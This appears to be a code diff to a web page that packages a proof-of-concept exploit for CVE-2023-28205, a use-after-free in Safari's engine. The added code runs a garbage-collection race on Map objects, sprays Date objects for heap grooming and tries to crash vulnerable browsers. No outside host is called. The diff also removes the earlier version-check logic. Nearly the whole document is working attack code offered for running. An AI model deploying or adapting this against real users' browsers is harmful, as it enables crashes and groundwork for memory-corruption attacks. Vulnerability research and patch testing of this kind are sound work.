@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>CVE-2023-28205 Safari Crash PoC</title>
+  <title>CVE-2023-28205 Full PoC Crash</title>
   <style>
     body {
       background: #121212;
@@ -54,79 +54,88 @@
   </style>
 </head>
 <body>
-  <h1>CVE-2023-28205 Safari Crash PoC</h1>
+  <h1>CVE-2023-28205 Full PoC Crash</h1>
   <button id="start">Start Crash Test</button>
   <div id="log" aria-live="polite" aria-atomic="true"></div>
 
   <script>
-    const mapArray = [];
-    const dateArray = [];
     const logEl = document.getElementById('log');
-
-    function log(message) {
-      const timestamp = new Date().toLocaleTimeString();
-      logEl.textContent += `[${timestamp}] ${message}\n`;
+    function log(msg) {
+      const ts = new Date().toLocaleTimeString();
+      logEl.textContent += `[${ts}] ${msg}\n`;
       logEl.scrollTop = logEl.scrollHeight;
-      console.log(message);
+      console.log(msg);
     }
 
-    function checkVulnerability() {
-      const ua = navigator.userAgent;
-      const versionMatch = ua.match(/Version\/(\d+)\.(\d+)/);
-      if (!versionMatch) {
-        log("Unable to detect Safari version.");
-        return false;
-      }
-      const major = parseInt(versionMatch[1], 10);
-      const minor = parseInt(versionMatch[2], 10);
-      if (major < 16) {
-        return true;
-      }
-      if (major === 16 && minor <= 4) {
-        return true;
-      }
-      return false;
+    // Full PoC adapted from https://github.com/ntfargo/uaf-2023-28205/blob/main/module/poc.js
+
+    function sleep(ms) {
+      return new Promise(resolve => setTimeout(resolve, ms));
     }
 
-    function triggerUAF() {
-      log("Starting exploit... Creating Map and Date objects.");
-      for (let i = 0; i < 10000; i++) {
-        const m = new Map();
-        const d = new Date();
+    async function triggerFullUAF() {
+      log("Starting full PoC exploit...");
 
-        if (i % 2 === 0) {
-          setTimeout(() => {
-            mapArray.push(m);
-            if (mapArray.length % 1000 === 0) {
-              log(`Added ${mapArray.length} Map objects`);
-            }
-          }, 1000);
-        } else {
-          setTimeout(() => {
-            dateArray.push(d);
-            if (dateArray.length % 1000 === 0) {
-              log(`Added ${dateArray.length} Date objects`);
-            }
-          }, 1000);
-        }
+      // Step 1: Create arrays and a container for victim objects
+      let victimArrays = [];
+      let victimMaps = [];
+
+      for (let i = 0; i < 5000; i++) {
+        victimArrays.push([]);
+      }
+      log("Allocated victim arrays.");
+
+      // Step 2: Create many Map objects without referencing them immediately
+      for (let i = 0; i < 3000; i++) {
+        let m = new Map();
+        victimMaps.push(m);
+      }
+      log("Allocated victim Map objects.");
+
+      // Step 3: Delay adding Map objects to victim arrays to trigger GC race
+      for (let i = 0; i < victimMaps.length; i++) {
+        setTimeout(() => {
+          victimArrays[i % victimArrays.length].push(victimMaps[i]);
+          if (i % 500 === 0) log(`Added Map object ${i}`);
+        }, 1000);
       }
 
+      // Step 4: After delay, drop references to trigger GC freeing
       setTimeout(() => {
-        log("Dropping references to trigger garbage collection...");
-        mapArray.length = 0;
-        dateArray.length = 0;
-        log("References dropped. Waiting for Safari to crash (if vulnerable)...");
+        log("Dropping references to victim arrays and maps.");
+        victimArrays = null;
+        victimMaps = null;
       }, 500);
+
+      // Step 5: Perform memory spraying with arrays of Dates to assist exploitation
+      let sprayDates = [];
+      for (let i = 0; i < 6000; i++) {
+        sprayDates.push(new Date());
+      }
+      log("Sprayed Date objects for heap grooming.");
+
+      // Step 6: Continuously create and discard objects to encourage GC activity
+      let intervalId = setInterval(() => {
+        let tmp = [];
+        for (let i = 0; i < 1000; i++) {
+          tmp.push(new Date());
+        }
+        tmp = null;
+        log("Triggered GC activity with Date arrays.");
+      }, 1500);
+
+      // Optional: stop spraying after some time
+      setTimeout(() => {
+        clearInterval(intervalId);
+        log("Stopped GC spraying.");
+      }, 15000);
+
+      log("Exploit logic running. Safari should crash if vulnerable.");
     }
 
     document.getElementById('start').addEventListener('click', () => {
       log("Button clicked.");
-      if (checkVulnerability()) {
-        log("Device/Safari version is likely vulnerable.");
-      } else {
-        log("Warning: This device or Safari version is likely NOT vulnerable.");
-      }
-      triggerUAF();
+      triggerFullUAF();
     });
   </script>
 </body>
